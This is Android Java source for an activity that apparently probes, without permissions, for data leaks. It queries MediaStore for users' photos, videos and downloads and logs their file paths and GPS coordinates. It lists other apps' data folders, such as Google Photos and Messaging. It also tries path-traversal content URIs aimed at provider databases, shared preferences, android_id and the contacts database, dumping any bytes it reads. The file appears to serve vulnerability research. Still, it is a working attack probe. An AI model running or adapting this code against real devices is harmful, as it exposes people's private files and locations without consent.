package com.vrp.zeroperm;

import android.app.Activity;
import android.content.ContentResolver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.os.Environment;
import android.util.Log;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.InputStream;

public class MediaProbeActivity extends Activity {
    private static final String T = "MEDIAPROBE";

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        Log.w(T, "=== MediaStore & Storage Probe ===");
        Log.w(T, "UID=" + android.os.Process.myUid());

        probeMediaStore();
        probeExternalStorage();
        probeContentUriTraversal();
        probeDocumentsProvider();

        Log.w(T, "=== PROBE COMPLETE ===");
    }

    private void probeMediaStore() {
        Log.w(T, "--- MediaStore Queries ---");
        ContentResolver cr = getContentResolver();

        Object[][] queries = {
            {"images", "content://media/external/images/media",
             new String[]{"_id", "_display_name", "date_added", "latitude", "longitude", "_data", "_size", "mime_type"}},
            {"video", "content://media/external/video/media",
             new String[]{"_id", "_display_name", "date_added", "latitude", "longitude", "_data", "_size"}},
            {"audio", "content://media/external/audio/media",
             new String[]{"_id", "_display_name", "date_added", "_data", "artist", "album", "title"}},
            {"downloads", "content://media/external/downloads",
             new String[]{"_id", "_display_name", "date_added", "_data", "_size", "mime_type"}},
            {"files_all", "content://media/external/file",
             new String[]{"_id", "_display_name", "date_added", "_data", "_size", "mime_type"}},
        };

        for (Object[] q : queries) {
            String label = (String) q[0];
            String uri = (String) q[1];
            String[] proj = (String[]) q[2];
            try {
                Cursor c = cr.query(Uri.parse(uri), proj, null, null, "date_added DESC");
                if (c != null) {
                    int count = c.getCount();
                    Log.w(T, "[+] " + label + ": " + count + " rows");
                    if (count > 0) {
                        Log.w(T, "[!!!] " + label + " ACCESSIBLE: " + count + " files");
                        int shown = 0;
                        while (c.moveToNext() && shown < 10) {
                            StringBuilder sb = new StringBuilder();
                            for (int i = 0; i < proj.length; i++) {
                                String val = c.getString(c.getColumnIndex(proj[i]));
                                if (val != null && val.length() > 0) {
                                    sb.append(proj[i]).append("=").append(val).append(" | ");
                                }
                            }
                            Log.w(T, "  [!!!] " + sb.toString());
                            shown++;
                        }
                    }
                    c.close();
                }
            } catch (SecurityException se) {
                Log.w(T, "[-] " + label + " SECURITY: " + se.getMessage());
            } catch (Exception e) {
                Log.w(T, "[-] " + label + ": " + e.getClass().getSimpleName());
            }
        }

        // Try querying with specific selections
        try {
            Cursor c = cr.query(Uri.parse("content://media/external/images/media"),
                new String[]{"_id", "_display_name", "latitude", "longitude", "_data"},
                "latitude IS NOT NULL AND latitude != 0", null, null);
            if (c != null) {
                Log.w(T, "[GPS] Images with GPS data: " + c.getCount());
                while (c.moveToNext()) {
                    String name = c.getString(1);
                    String lat = c.getString(2);
                    String lon = c.getString(3);
                    String path = c.getString(4);
                    Log.w(T, "[!!!][GPS] " + name + " lat=" + lat + " lon=" + lon + " path=" + path);
                }
                c.close();
            }
        } catch (Exception e) {
            Log.w(T, "[-] GPS query: " + e.getClass().getSimpleName());
        }
    }

    private void probeExternalStorage() {
        Log.w(T, "--- External Storage Access ---");

        // Try to list Android/data directories of other apps
        File extDir = Environment.getExternalStorageDirectory();
        Log.w(T, "External: " + extDir.getAbsolutePath());

        File androidData = new File(extDir, "Android/data");
        File androidObb = new File(extDir, "Android/obb");

        String[] targets = {
            "com.google.android.gms", "com.google.android.apps.photos",
            "com.google.android.apps.docs", "com.google.android.youtube",
            "com.google.android.apps.messaging", "com.google.android.dialer",
        };

        for (String pkg : targets) {
            File dir = new File(androidData, pkg);
            try {
                if (dir.exists()) {
                    String[] files = dir.list();
                    if (files != null && files.length > 0) {
                        Log.w(T, "[!!!] " + pkg + " data dir READABLE: " + files.length + " entries");
                        for (String f : files) {
                            Log.w(T, "  [!!!] " + f);
                        }
                    }
                } else {
                    Log.w(T, "[-] " + pkg + " not exists or not readable");
                }
            } catch (SecurityException se) {
                Log.w(T, "[-] " + pkg + " SECURITY");
            }
        }

        // Try to read specific files
        String[] filePaths = {
            "/sdcard/Android/data/com.google.android.gms/files/",
            "/sdcard/Download/",
            "/sdcard/DCIM/",
            "/sdcard/Pictures/",
            "/sdcard/Documents/",
        };

        for (String path : filePaths) {
            try {
                File f = new File(path);
                if (f.exists() && f.isDirectory()) {
                    String[] contents = f.list();
                    if (contents != null) {
                        Log.w(T, "[+] " + path + ": " + contents.length + " entries");
                        for (int i = 0; i < Math.min(contents.length, 5); i++) {
                            Log.w(T, "  " + contents[i]);
                        }
                    }
                }
            } catch (Exception e) {}
        }
    }

    private void probeContentUriTraversal() {
        Log.w(T, "--- Content URI Path Traversal ---");
        ContentResolver cr = getContentResolver();

        // Try path traversal on various providers
        String[][] traversals = {
            {"gms_fileprovider", "content://com.google.android.gms.fileprovider/../../databases/"},
            {"gms_fileprovider2", "content://com.google.android.gms.fileprovider/../shared_prefs/"},
            {"docs_fileprovider", "content://com.google.android.apps.docs.storage/../../../databases/"},
            {"media_traversal", "content://media/external/../internal/images/media"},
            {"settings_traversal", "content://settings/system/../secure/android_id"},
            {"contacts_traversal", "content://com.android.contacts/../../data/data/com.android.providers.contacts/databases/contacts2.db"},
        };

        for (String[] t : traversals) {
            try {
                Cursor c = cr.query(Uri.parse(t[1]), null, null, null, null);
                if (c != null) {
                    Log.w(T, "[!!!] " + t[0] + " ACCESSIBLE: " + c.getCount() + " rows");
                    c.close();
                }
            } catch (SecurityException se) {
                Log.w(T, "[-] " + t[0] + " SECURITY");
            } catch (Exception e) {
                Log.w(T, "[-] " + t[0] + ": " + e.getClass().getSimpleName());
            }

            // Also try openInputStream
            try {
                InputStream is = cr.openInputStream(Uri.parse(t[1]));
                if (is != null) {
                    byte[] buf = new byte[256];
                    int read = is.read(buf);
                    if (read > 0) {
                        Log.w(T, "[!!!] " + t[0] + " FILE READ: " + read + " bytes");
                        StringBuilder hex = new StringBuilder();
                        for (int i = 0; i < Math.min(read, 32); i++) {
                            hex.append(String.format("%02x", buf[i]));
                        }
                        Log.w(T, "  HEX: " + hex);
                    }
                    is.close();
                }
            } catch (SecurityException se) {
                // expected
            } catch (Exception e) {}
        }
    }

    private void probeDocumentsProvider() {
        Log.w(T, "--- DocumentsProvider Probe ---");
        ContentResolver cr = getContentResolver();

        // Try to access DocumentsProviders from various apps
        String[][] docUris = {
            {"external_storage", "content://com.android.externalstorage.documents/root/primary"},
            {"downloads_docs", "content://com.android.providers.downloads.documents/root"},
            {"media_docs", "content://com.android.providers.media.documents/root"},
            {"gms_drive", "content://com.google.android.apps.docs.storage/root"},
        };

        for (String[] d : docUris) {
            try {
                Cursor c = cr.query(Uri.parse(d[1]), null, null, null, null);
                if (c != null) {
                    int count = c.getCount();
                    Log.w(T, "[+] " + d[0] + ": " + count + " roots");
                    if (count > 0 && c.moveToFirst()) {
                        String[] cols = c.getColumnNames();
                        for (int i = 0; i < Math.min(cols.length, 8); i++) {
                            try {
                                String val = c.getString(i);
                                if (val != null) Log.w(T, "  " + cols[i] + "=" + val);
                            } catch (Exception e) {}
                        }
                    }
                    c.close();
                }
            } catch (SecurityException se) {
                Log.w(T, "[-] " + d[0] + " SECURITY");
            } catch (Exception e) {
                Log.w(T, "[-] " + d[0] + ": " + e.getClass().getSimpleName());
            }
        }
    }
}
